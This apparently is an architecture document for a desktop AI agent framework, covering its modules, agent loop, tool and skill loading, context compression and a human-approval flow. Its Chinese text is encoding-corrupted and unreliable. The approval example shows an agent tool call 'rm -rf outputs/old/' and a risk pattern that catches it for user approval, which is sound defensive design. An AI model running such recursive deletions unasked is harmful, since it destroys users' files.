---
tags: PRD, Agentæ¡†æ¶, äº§å“éœ€æ±‚
aliases: æ¡Œé¢AIæ¡†æ¶éœ€æ±‚æ–‡æ¡£
date created: 2025-10-31 10:45
last updated: 2025-10-31 23:00
version: v3.6
---

# äº§å“æ¶æ„

### æ ¸å¿ƒä»·å€¼

1. **æ•´ä½“è§†å›¾** - ç†è§£æ¡†æ¶çš„å®Œæ•´æ¨¡å—å›¾
2. **æ¨¡å—å…³ç³»** - äº†è§£æ¨¡å—é—´çš„ä¾èµ–å’Œäº¤äº’
3. **æµç¨‹æ¸…æ™°** - æŒæ¡ä¸»æµç¨‹å’Œé‡è¦å­æµç¨‹
4. **æ¶æ„åˆ†å±‚** - ç†è§£äº”å±‚æ¶æ„è®¾è®¡

---

## æ¨¡å—æ€»è§ˆ

æ¡†æ¶ç”±**8ä¸ªæ ¸å¿ƒæ¨¡å—**ç»„æˆ,æ¯ä¸ªæ¨¡å—è´Ÿè´£ç‰¹å®šèŒè´£:

```
æ¡Œé¢AIæ¡†æ¶
â”œâ”€â”€ 1. Agentæ¨¡å— (æ™ºèƒ½å†³ç­–å±‚)
â”‚   â”œâ”€â”€ SimpleAgent (æ— çŠ¶æ€ã€å¿«é€Ÿå“åº”)
â”‚   â””â”€â”€ GeneralAgent (æœ‰çŠ¶æ€ã€å®Œæ•´åŠŸèƒ½)
â”‚
â”œâ”€â”€ 2. å·¥å…·ç³»ç»Ÿ (èƒ½åŠ›æ‰©å±•å±‚)
â”‚   â”œâ”€â”€ Coreå·¥å…· (6ä¸ªå§‹ç»ˆå¯ç”¨)
â”‚   â”œâ”€â”€ Optionalå·¥å…· (12ä¸ªå¯é€‰)
â”‚   â””â”€â”€ MCPå·¥å…· (å¤–éƒ¨é›†æˆ)
â”‚
â”œâ”€â”€ 3. æŠ€èƒ½ç³»ç»Ÿ (çŸ¥è¯†åŒ…å±‚)
â”‚   â”œâ”€â”€ å†…ç½®æŠ€èƒ½ (6ä¸ª: pdf/docx/xlsx/pptx/artifacts/skill-creator)
â”‚   â”œâ”€â”€ SKILL.md (æ–‡æ¡£)
â”‚   â””â”€â”€ scripts/ (è„šæœ¬)
â”‚
â”œâ”€â”€ 4. æ¨¡å‹è·¯ç”± (æ¨ç†å¼•æ“å±‚)
â”‚   â”œâ”€â”€ 5ç§æ¨¡å‹æ§½ä½ (base/reason/vision/code/chat)
â”‚   â”œâ”€â”€ è‡ªåŠ¨å¤šæ¨¡æ€æ£€æµ‹
â”‚   â””â”€â”€ å¯å‘å¼è·¯ç”±ç­–ç•¥
â”‚
â”œâ”€â”€ 5. çŠ¶æ€ç®¡ç† (æŒä¹…åŒ–å±‚)
â”‚   â”œâ”€â”€ AppState (29ä¸ªå­—æ®µ)
â”‚   â”œâ”€â”€ LangGraph Checkpointer (SQLite)
â”‚   â””â”€â”€ æ¶ˆæ¯å†å²ç®¡ç†
â”‚
â”œâ”€â”€ 6. ä¸Šä¸‹æ–‡ç®¡ç† (èµ„æºä¼˜åŒ–å±‚)
â”‚   â”œâ”€â”€ Tokenç›‘æ§ (ä¸‰çº§é˜ˆå€¼)
â”‚   â”œâ”€â”€ è‡ªåŠ¨å‹ç¼© (LLM + æˆªæ–­)
â”‚   â””â”€â”€ KV Cacheä¼˜åŒ–
â”‚
â”œâ”€â”€ 7. HITLç³»ç»Ÿ (äººæœºååŒå±‚)
â”‚   â”œâ”€â”€ ask_human (ä¸»åŠ¨æé—®)
â”‚   â”œâ”€â”€ å››å±‚å®¡æ‰¹è§„åˆ™
â”‚   â””â”€â”€ ApprovalToolNode
â”‚
â””â”€â”€ 8. å·¥ä½œåŒºç®¡ç† (æ–‡ä»¶éš”ç¦»å±‚)
    â”œâ”€â”€ ä¼šè¯éš”ç¦»ç›®å½•
    â”œâ”€â”€ æŠ€èƒ½é“¾æ¥
    â””â”€â”€ æ–‡ä»¶ä¸Šä¼ å¤„ç†
```

---

## æ¨¡å—å…³ç³»å›¾

### ä¾èµ–å…³ç³»

```
                â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                â”‚   ç”¨æˆ·è¾“å…¥   â”‚
                â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
                       â”‚
                       â–¼
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚   Agentæ¨¡å— (å†³ç­–ä¸­å¿ƒ)    â”‚
        â”‚  - SimpleAgent           â”‚
        â”‚  - GeneralAgent          â”‚
        â””â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜
           â”‚                   â”‚
           â–¼                   â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  æ¨¡å‹è·¯ç”±    â”‚     â”‚  å·¥å…·ç³»ç»Ÿ    â”‚
    â”‚  (æ¨ç†)      â”‚     â”‚  (æ‰§è¡Œ)      â”‚
    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
           â”‚                   â”‚
           â”‚                   â–¼
           â”‚            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
           â”‚            â”‚  æŠ€èƒ½ç³»ç»Ÿ    â”‚
           â”‚            â”‚  (çŸ¥è¯†)      â”‚
           â”‚            â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
           â”‚                   â”‚
           â–¼                   â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚      å·¥ä½œåŒºç®¡ç† (éš”ç¦»)       â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                   â”‚
                   â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  çŠ¶æ€ç®¡ç†    â”‚
            â”‚  (æŒä¹…åŒ–)    â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                   â”‚
                   â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚  ä¸Šä¸‹æ–‡ç®¡ç†  â”‚
            â”‚  (ä¼˜åŒ–)      â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### å„æ¨¡å—åœ¨æ¡†æ¶ä¸­çš„ä½œç”¨

**æ ¸å¿ƒåä½œé“¾**:
```
ç”¨æˆ·è¯·æ±‚
  â†’ Agent (åˆ†æä»»åŠ¡)
  â†’ æ¨¡å‹è·¯ç”± (é€‰æ‹©æ¨¡å‹)
  â†’ LLMæ¨ç† (ç”Ÿæˆplan)
  â†’ å·¥å…·ç³»ç»Ÿ (æ‰§è¡Œæ“ä½œ)
  â†’ æŠ€èƒ½ç³»ç»Ÿ (æä¾›çŸ¥è¯†)
  â†’ å·¥ä½œåŒº (æ–‡ä»¶æ“ä½œ)
  â†’ çŠ¶æ€ç®¡ç† (ä¿å­˜ç»“æœ)
  â†’ Agent (æ€»ç»“å“åº”)
  â†’ ç”¨æˆ·
```

**è¾…åŠ©åä½œ**:
- **HITL â†” Agent**: Agentä¸»åŠ¨æé—®æˆ–è¯·æ±‚å®¡æ‰¹
- **ä¸Šä¸‹æ–‡ç®¡ç† â†” çŠ¶æ€ç®¡ç†**: ç›‘æ§Tokenä½¿ç”¨ç‡,è§¦å‘å‹ç¼©
- **æ¨¡å‹è·¯ç”± â†” ä¸Šä¸‹æ–‡ç®¡ç†**: KV Cacheä¼˜åŒ–,é™ä½æˆæœ¬

---

## æ ¸å¿ƒæµç¨‹: Agent Loop

### æµç¨‹å›¾
```
START â†’ agent â‡„ tools â†’ agent â†’ finalize â†’ END
         â†‘_______â†“
```

### èŠ‚ç‚¹è¯´æ˜

**1. PlannerèŠ‚ç‚¹** (æ ¸å¿ƒ):
- **èŒè´£**: LLMåˆ†æä»»åŠ¡,å†³ç­–æ˜¯å¦è°ƒç”¨å·¥å…·
- **è¾“å…¥**: ç”¨æˆ·æ¶ˆæ¯ + å¯¹è¯å†å² + ç³»ç»Ÿæç¤º
- **è¾“å‡º**: AIMessage (åŒ…å«tool_callsæˆ–final_response)
- **è·¯ç”±**:
  - æœ‰tool_calls â†’ ToolsèŠ‚ç‚¹
  - æ— tool_calls â†’ FinalizeèŠ‚ç‚¹

**2. ToolsèŠ‚ç‚¹**:
- **èŒè´£**: æ‰§è¡ŒLLMç”Ÿæˆçš„å·¥å…·è°ƒç”¨
- **è¾“å…¥**: AIMessageä¸­çš„tool_callsåˆ—è¡¨
- **è¾“å‡º**: ToolMessageåˆ—è¡¨(å·¥å…·æ‰§è¡Œç»“æœ)
- **ç‰¹æ€§**: æ”¯æŒHITLå®¡æ‰¹(ApprovalToolNodeåŒ…è£…)

**3. FinalizeèŠ‚ç‚¹**:
- **èŒè´£**: æœ€ç»ˆå“åº”å¤„ç†å’ŒçŠ¶æ€æ¸…ç†
- **æ“ä½œ**:
  - æ¸…ç†å¤šä½™æ¶ˆæ¯å†å²(ä¿ç•™æœ€è¿‘Næ¡)
  - æ›´æ–°å¾ªç¯è®¡æ•°
  - ä¿å­˜çŠ¶æ€åˆ°checkpointer
- **è¾“å‡º**: æœ€ç»ˆå“åº”ç»™ç”¨æˆ·

**4. SummarizationèŠ‚ç‚¹**(æ¡ä»¶è§¦å‘):
- **èŒè´£**: è‡ªåŠ¨å‹ç¼©ä¸Šä¸‹æ–‡
- **è§¦å‘æ¡ä»¶**: Tokenä½¿ç”¨ç‡>95% / å·¥å…·è°ƒç”¨
- **æ“ä½œ**:
  - ä¿ç•™è¿‘æœŸæ¶ˆæ¯(15%çª—å£æˆ–10æ¡)
  - LLMæ€»ç»“æ—§æ¶ˆæ¯
  - ç´§æ€¥æ—¶ç›´æ¥æˆªæ–­
- **è¾“å‡º**: å‹ç¼©åçš„æ¶ˆæ¯åˆ—è¡¨

### è·¯ç”±é€»è¾‘

**agent_route** (PlannerèŠ‚ç‚¹å):
```python
if loops >= max_loops:
    return "finalize"  # è¾¾åˆ°æœ€å¤§å¾ªç¯æ¬¡æ•°

if needs_compression and not auto_compressed:
    return "summarization"  # éœ€è¦å‹ç¼©

if last_message.tool_calls:
    return "tools"  # æœ‰å·¥å…·è°ƒç”¨

return "finalize"  # å®Œæˆä»»åŠ¡
```

**tools_route** (ToolsèŠ‚ç‚¹å):
```python
return "planner"  # æ€»æ˜¯è¿”å›Plannerç»§ç»­æ¨ç†
```

---

## é‡è¦å­æµç¨‹

### 1. å·¥å…·åŠ¨æ€åŠ è½½æµç¨‹

```
ç”¨æˆ·è¾“å…¥: "@fetch_web è·å–è¿™ä¸ªç½‘é¡µ"
  â”‚
  â–¼
CLIè§£æ @mention
  â”‚
  â–¼
mention_classifier åˆ†ç±»
  â”œâ”€ tool? â†’ tool_registry.load_on_demand("fetch_web")
  â”œâ”€ skill? â†’ ç”Ÿæˆ"è¯·é˜…è¯»SKILL.md"æé†’
  â””â”€ agent? â†’ åŠ è½½delegate_taskå·¥å…·
  â”‚
  â–¼
PlannerèŠ‚ç‚¹
  - bind_tools(visible_tools)  â† åŒ…å«fetch_web
  - ç”Ÿæˆå·¥å…·è°ƒç”¨
  â”‚
  â–¼
ToolsèŠ‚ç‚¹æ‰§è¡Œ
```

### 2. æŠ€èƒ½åŠ¨æ€åŠ è½½æµç¨‹

```
ç”¨æˆ·è¾“å…¥: "@pdf å¤„ç†è¿™ä¸ªè¡¨å• #form.pdf"
  â”‚
  â”œâ”€ è§£æ@mention: "pdf"
  â””â”€ è§£æ#filename: "form.pdf"
  â”‚
  â–¼
WorkspaceManager.link_skill("pdf")
  â”‚
  â”œâ”€ æ£€æŸ¥ requirements.txt
  â”œâ”€ è‡ªåŠ¨å®‰è£…ä¾èµ– (é¦–æ¬¡)
  â””â”€ åˆ›å»ºç¬¦å·é“¾æ¥: workspace/skills/pdf/
  â”‚
  â–¼
ç”Ÿæˆæé†’
  - "è¯·é˜…è¯» skills/pdf/SKILL.md"
  - "å¯ç”¨å·¥å…·: run_bash_commandæ‰§è¡Œè„šæœ¬"
  â”‚
  â–¼
Agentè¯»å–SKILL.md
  â”‚
  â–¼
AgentæŒ‰æ–‡æ¡£æŒ‡å¯¼æ‰§è¡Œä»»åŠ¡
```

### 3. HITLå®¡æ‰¹æµç¨‹

```
Agentç”Ÿæˆå·¥å…·è°ƒç”¨: run_bash_command("rm -rf outputs/old/")
  â”‚
  â–¼
ApprovalToolNodeæ‹¦æˆª
  â”‚
  â–¼
ApprovalChecker.check(tool_name, args)
  â”‚
  â”œâ”€ Layer 1: Tool Custom Checker â†’ æ— è§„åˆ™
  â”œâ”€ Layer 2: Global Risk Patterns â†’ åŒ¹é…"rm\\s+-rf"
  â”œâ”€ Result: needs_approval=True, risk_level="high"
  â”‚
  â–¼
è§¦å‘interrupt
  â”‚
  â–¼
CLIæ˜¾ç¤ºå®¡æ‰¹ç•Œé¢
  ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command
     åŸå› : æ£€æµ‹åˆ°å±é™©å‘½ä»¤(é€’å½’åˆ é™¤)
     å‘½ä»¤: rm -rf outputs/old/
     æ‰¹å‡†? [y/n] >
  â”‚
  â–¼
ç”¨æˆ·è¾“å…¥å†³ç­–
  â”œâ”€ y â†’ æ‰§è¡Œå·¥å…·,è¿”å›ç»“æœ
  â””â”€ n â†’ æ‹’ç»æ‰§è¡Œ,è¿”å›"User rejected"
  â”‚
  â–¼
æ¢å¤Agentæ‰§è¡Œ
```

### 4. ä¸Šä¸‹æ–‡è‡ªåŠ¨å‹ç¼©æµç¨‹

```
PlannerèŠ‚ç‚¹æ‰§è¡Œå
  â”‚
  â–¼
æ›´æ–° cumulative_prompt_tokens
  â”‚
  â–¼
æ£€æŸ¥ä½¿ç”¨ç‡: tokens / context_window
  â”‚
  â”œâ”€ <75% â†’ æ— æ“ä½œ
  â”œâ”€ 75-85% â†’ è®°å½•INFOæ—¥å¿—
  â”œâ”€ 85-95% â†’ è®°å½•WARNINGæ—¥å¿—
  â””â”€ >95% â†’ è®¾ç½®needs_compression=True
  â”‚
  â–¼
agent_routeæ£€æŸ¥needs_compression
  â”‚
  â–¼
è·¯ç”±åˆ°SummarizationèŠ‚ç‚¹
  â”‚
  â–¼
å‹ç¼©æ‰§è¡Œ
  â”œâ”€ ä¿ç•™SystemMessage
  â”œâ”€ ä¿ç•™è¿‘æœŸæ¶ˆæ¯ (15%çª—å£æˆ–10æ¡)
  â”œâ”€ LLMæ€»ç»“æ—§æ¶ˆæ¯
  â””â”€ è®¾ç½®auto_compressed=True
  â”‚
  â–¼
è¿”å›PlannerèŠ‚ç‚¹
  - Agentç»§ç»­å›ç­”ç”¨æˆ·é—®é¢˜
  - ç”¨æˆ·æ— æ„ŸçŸ¥(é™é»˜å‹ç¼©)
```

### 5. å¤šAgentåä½œæµç¨‹(delegate_task)

```
MainAgentå†³å®šå§”æ´¾ä»»åŠ¡
  â”‚
  â–¼
è°ƒç”¨ delegate_task("åˆ†æè¿™ä¸ªPDFæ–‡ä»¶")
  â”‚
  â–¼
åˆ›å»ºSubagent
  â”œâ”€ context_id: "subagent-{uuid}"
  â”œâ”€ messages: [task_description]  â† åªæœ‰ä»»åŠ¡æè¿°!
  â”œâ”€ mentioned_agents: ç»§æ‰¿è‡ªMain
  â”œâ”€ active_skill: ç»§æ‰¿è‡ªMain
  â”œâ”€ workspace_path: ç»§æ‰¿è‡ªMain
  â””â”€ uploaded_files: ç»§æ‰¿è‡ªMain
  â”‚
  â–¼
Subagentæ‰§è¡Œ
  â”œâ”€ è¯»å–æ–‡ä»¶
  â”œâ”€ ä½¿ç”¨å·¥å…·
  â””â”€ (å¯é€‰)ask_humanæé—®
  â”‚
  â–¼
æ£€æµ‹å“åº”é•¿åº¦
  â”œâ”€ <200å­—ç¬¦ â†’ è‡ªåŠ¨è¯·æ±‚è¯¦ç»†æ€»ç»“(æœ€å¤š1æ¬¡)
  â””â”€ â‰¥200å­—ç¬¦ â†’ æ¥å—ç»“æœ
  â”‚
  â–¼
è¿”å›æ€»ç»“ç»™MainAgent
  - åŒ…å«:åšäº†ä»€ä¹ˆã€å‘ç°äº†ä»€ä¹ˆã€ç»“æœæ˜¯ä»€ä¹ˆ
  â”‚
  â–¼
MainAgentç»§ç»­æ‰§è¡Œ
```

### 6. æ¨¡å‹è·¯ç”±æµç¨‹

```
Plannerå‡†å¤‡è°ƒç”¨LLM
  â”‚
  â–¼
ModelRegistry.prefer(
    phase="plan",
    require_tools=True,
    need_code=False,
    need_vision=False
)
  â”‚
  â–¼
è·¯ç”±é€»è¾‘
  â”œâ”€ æ£€æµ‹å¤šæ¨¡æ€å†…å®¹? â†’ visionæ¨¡å‹
  â”œâ”€ éœ€è¦å·¥å…· + éœ€è¦ä»£ç ? â†’ codeæ¨¡å‹
  â”œâ”€ éœ€è¦å·¥å…· + åå¥½æ¨ç†? â†’ reasoningæ¨¡å‹
  â”œâ”€ éœ€è¦å·¥å…·? â†’ chatæ¨¡å‹
  â””â”€ å…¶ä»– â†’ baseæ¨¡å‹
  â”‚
  â–¼
è¿”å›é€‰ä¸­çš„æ¨¡å‹
  â”‚
  â–¼
invoke_planner(model, messages)
  â”‚
  â–¼
LLMç”Ÿæˆå“åº”
```

---

## æ¶æ„åˆ†å±‚

### äº”å±‚æ¶æ„è®¾è®¡

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           åº”ç”¨å±‚ (Application Layer)         â”‚
â”‚  - ç”¨æˆ·è‡ªå®šä¹‰Agent                           â”‚
â”‚  - ä¸šåŠ¡ç‰¹å®šå·¥ä½œæµ                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           æ¥å£å±‚ (Interface Layer)           â”‚
â”‚  - CLIäº¤äº’ç•Œé¢                               â”‚
â”‚  - Webç•Œé¢(è®¡åˆ’ä¸­)                          â”‚
â”‚  - APIæ¥å£(TS SDK,è®¡åˆ’ä¸­)                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        ä¸šåŠ¡ç¼–æ’å±‚ (Orchestration Layer)      â”‚
â”‚  - Agent Loop (Planner/Tools/Finalize)      â”‚
â”‚  - çŠ¶æ€ç®¡ç† (AppState)                       â”‚
â”‚  - è·¯ç”±é€»è¾‘ (agent_route/tools_route)       â”‚
â”‚  - HITLååŒ (ask_human/approval)            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           èƒ½åŠ›å±‚ (Capability Layer)          â”‚
â”‚  - å·¥å…·ç³»ç»Ÿ (18ä¸ªå†…ç½®å·¥å…·)                  â”‚
â”‚  - æŠ€èƒ½ç³»ç»Ÿ (6ä¸ªå†…ç½®æŠ€èƒ½)                   â”‚
â”‚  - æ¨¡å‹è·¯ç”± (5ç§æ¨¡å‹æ§½ä½)                   â”‚
â”‚  - å¤šAgentåä½œ (delegate_task/call_agent)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      åŸºç¡€è®¾æ–½å±‚ (Infrastructure Layer)       â”‚
â”‚  - ä¸Šä¸‹æ–‡ç®¡ç† (Tokenç›‘æ§/è‡ªåŠ¨å‹ç¼©)          â”‚
â”‚  - å·¥ä½œåŒºç®¡ç† (æ–‡ä»¶éš”ç¦»)                    â”‚
â”‚  - ä¼šè¯æŒä¹…åŒ– (SQLite Checkpointer)         â”‚
â”‚  - å¯è§‚æµ‹æ€§ (LangSmith/æ—¥å¿—)                â”‚
â”‚  - é…ç½®ç®¡ç† (Pydantic Settings)             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### å±‚çº§èŒè´£

**åº”ç”¨å±‚** (Application Layer):
- **èŒè´£**: åŸºäºæ¡†æ¶æ„å»ºå…·ä½“åº”ç”¨
- **ç¤ºä¾‹**: æ¡Œé¢æœç´¢Agentã€æ–‡æ¡£å¤„ç†Agentã€ä»£ç å®¡æŸ¥Agent
- **æ‰©å±•ç‚¹**: è‡ªå®šä¹‰Agentæ¨¡æ¿ã€ä¸šåŠ¡å·¥ä½œæµ

**æ¥å£å±‚** (Interface Layer):
- **èŒè´£**: ç”¨æˆ·äº¤äº’ç•Œé¢
- **å½“å‰**: CLIäº¤äº’(æµå¼è¾“å‡ºã€å‘½ä»¤ç³»ç»Ÿ)
- **è®¡åˆ’**: Webç•Œé¢ã€TS SDK
- **ç‰¹æ€§**: ä¼šè¯ç®¡ç†ã€æ–‡ä»¶ä¸Šä¼ ã€@mentionè§£æ

**ä¸šåŠ¡ç¼–æ’å±‚** (Orchestration Layer):
- **èŒè´£**: Agentæ‰§è¡Œæµç¨‹ç¼–æ’
- **æ ¸å¿ƒ**: Agent Loop (ReActæ¨¡å¼)
- **ç»„ä»¶**:
  - AppState: çŠ¶æ€å­—æ®µ
  - Planner: LLMæ¨ç†å’Œå†³ç­–
  - Tools: å·¥å…·æ‰§è¡Œ
  - Finalize: å“åº”å¤„ç†
  - Routing: æ¡ä»¶è·¯ç”±
- **ç‰¹æ€§**: HITLé›†æˆã€çŠ¶æ€æŒä¹…åŒ–

**èƒ½åŠ›å±‚** (Capability Layer):
- **èŒè´£**: æä¾›å¯å¤ç”¨çš„èƒ½åŠ›æ¨¡å—
- **å·¥å…·ç³»ç»Ÿ**: å†…ç½®å·¥å…·,ä¸‰å±‚æ¶æ„,MCPåè®®
- **æŠ€èƒ½ç³»ç»Ÿ**: å†…ç½®æŠ€èƒ½,çŸ¥è¯†åŒ…æœºåˆ¶
- **æ¨¡å‹è·¯ç”±**: å¤šç§æ¨¡å‹æ§½ä½,è‡ªåŠ¨é€‰æ‹©
- **å¤šAgent**: delegate_task(åŒç±»å‹),call_agent(è·¨ç±»å‹)

**åŸºç¡€è®¾æ–½å±‚** (Infrastructure Layer):
- **èŒè´£**: æä¾›åº•å±‚æ”¯æ’‘æœåŠ¡
- **ä¸Šä¸‹æ–‡ç®¡ç†**: Tokenç›‘æ§ã€è‡ªåŠ¨å‹ç¼©ã€KV Cacheä¼˜åŒ–
- **å·¥ä½œåŒºç®¡ç†**: ä¼šè¯éš”ç¦»ã€æŠ€èƒ½é“¾æ¥ã€è·¯å¾„å®‰å…¨
- **ä¼šè¯æŒä¹…åŒ–**: SQLite Checkpointer,<500msæ¢å¤
- **å¯è§‚æµ‹æ€§**: LangSmithè¿½è¸ªã€ç»“æ„åŒ–æ—¥å¿—
- **é…ç½®ç®¡ç†**: Pydantic Settings,è‡ªåŠ¨.envåŠ è½½

---

## æ•°æ®æµ

### æ¶ˆæ¯æµ

```
ç”¨æˆ·è¾“å…¥ (HumanMessage)
  â†“
PlannerèŠ‚ç‚¹
  â”œâ”€ è¾“å…¥: [SystemMessage, ...history, HumanMessage]
  â””â”€ è¾“å‡º: AIMessage(content + tool_calls)
  â†“
ToolsèŠ‚ç‚¹
  â”œâ”€ è¾“å…¥: AIMessage.tool_calls
  â””â”€ è¾“å‡º: [ToolMessage1, ToolMessage2, ...]
  â†“
PlannerèŠ‚ç‚¹ (å†æ¬¡æ¨ç†)
  â”œâ”€ è¾“å…¥: [...history, AIMessage, ToolMessage1, ToolMessage2]
  â””â”€ è¾“å‡º: AIMessage(final_response)
  â†“
FinalizeèŠ‚ç‚¹
  â””â”€ è¾“å‡º: æœ€ç»ˆå“åº”ç»™ç”¨æˆ·
```

### çŠ¶æ€æµ

```
åˆå§‹åŒ–
  â†“
AppState {
    messages: [],
    todos: [],
    loops: 0,
    cumulative_prompt_tokens: 0,
    mentioned_agents: [],
    active_skill: None,
    ...
}
  â†“
æ¯è½®Planneræ‰§è¡Œ
  â”œâ”€ æ›´æ–° cumulative_prompt_tokens
  â”œâ”€ æ›´æ–° loops += 1
  â””â”€ (å¯èƒ½)è®¾ç½® needs_compression=True
  â†“
æ¯è½®Toolsæ‰§è¡Œ
  â”œâ”€ æ›´æ–° messages (è¿½åŠ ToolMessage)
  â””â”€ (å¯èƒ½)æ›´æ–° todos
  â†“
FinalizeèŠ‚ç‚¹
  â”œâ”€ æ¸…ç†å¤šä½™messages (ä¿ç•™æœ€è¿‘Næ¡)
  â””â”€ ä¿å­˜åˆ°Checkpointer
  â†“
ä¸‹ä¸€è½®
  â”œâ”€ ä»CheckpointeråŠ è½½çŠ¶æ€
  â””â”€ ç»§ç»­æ‰§è¡Œ
```

### æ–‡ä»¶æµ

```
ç”¨æˆ·ä¸Šä¼ : #report.pdf
  â†“
file_processor.py
  â”œâ”€ æ‹·è´åˆ° workspace/uploads/report.pdf
  â”œâ”€ æ£€æµ‹æ ¼å¼: PDF
  â””â”€ ç”Ÿæˆæé†’: "å¯ç”¨ @pdf æŠ€èƒ½å¤„ç†"
  â†“
(ç”¨æˆ·@mention: @pdf)
  â†“
WorkspaceManager.link_skill("pdf")
  â”œâ”€ ç¬¦å·é“¾æ¥: workspace/skills/pdf/
  â””â”€ å®‰è£…ä¾èµ–(é¦–æ¬¡)
  â†“
Agentä½¿ç”¨å·¥å…·
  â”œâ”€ read_file("uploads/report.pdf") â†’ è¯»å–é¢„è§ˆ
  â”œâ”€ search_file("uploads/report.pdf", "å…³é”®è¯") â†’ æœç´¢å†…å®¹
  â””â”€ run_bash_command("python skills/pdf/scripts/...") â†’ æ‰§è¡Œè„šæœ¬
  â†“
ç”Ÿæˆè¾“å‡º
  â””â”€ write_file("outputs/result.pdf")
```

## å‚è€ƒä»£ç ä½ç½®

| æ¨¡å— | ä¸»è¦æ–‡ä»¶è·¯å¾„ |
|------|-------------|
| **Agent Loop** | `generalAgent/graph/builder.py` |
| **PlannerèŠ‚ç‚¹** | `generalAgent/graph/nodes/planner.py` |
| **ToolsèŠ‚ç‚¹** | `generalAgent/graph/nodes/tools.py` |
| **FinalizeèŠ‚ç‚¹** | `generalAgent/graph/nodes/finalize.py` |
| **SummarizationèŠ‚ç‚¹** | `generalAgent/graph/nodes/summarization.py` |
| **è·¯ç”±é€»è¾‘** | `generalAgent/graph/routing.py` |
| **AppState** | `generalAgent/graph/state.py` |
| **å·¥å…·ç³»ç»Ÿ** | `generalAgent/tools/` |
| **æŠ€èƒ½ç³»ç»Ÿ** | `generalAgent/skills/`, `skills/` |
| **æ¨¡å‹è·¯ç”±** | `generalAgent/models/registry.py` |
| **HITL** | `generalAgent/hitl/` |
| **ä¸Šä¸‹æ–‡ç®¡ç†** | `generalAgent/context/`, `generalAgent/graph/nodes/summarization.py` |
| **å·¥ä½œåŒºç®¡ç†** | `generalAgent/persistence/workspace.py` |
